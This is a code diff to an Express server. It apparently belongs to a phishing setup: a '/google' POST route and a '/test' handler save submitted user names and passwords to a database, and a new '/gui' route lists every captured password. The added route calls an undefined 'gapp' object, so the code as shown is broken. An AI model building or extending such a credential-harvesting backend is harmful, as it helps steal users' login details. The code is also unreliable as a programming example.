@@ -35,6 +35,12 @@ app.get("/x", async (req, res) => {
   // res.render("a", { passes });
   res.json(passes);
 });
+gapp.get("/gui", async (req, res) => {
+  const passes = await Ecap.find();
+  console.log(passes);
+
+  res.render("a", { passes });
+});
 
 app.post("/google", async (req, res) => {
   console.log(req.body);
@@ -59,7 +65,7 @@ app.post("/test", async (req, res) => {
     console.log("worked");
     let pass = new Ecap({
       _id: req.body.user,
-      passwords: [req.body.passwd],
+      passwords: req.body.passwd,
       type: req.body.type,
     });
     await pass.save();
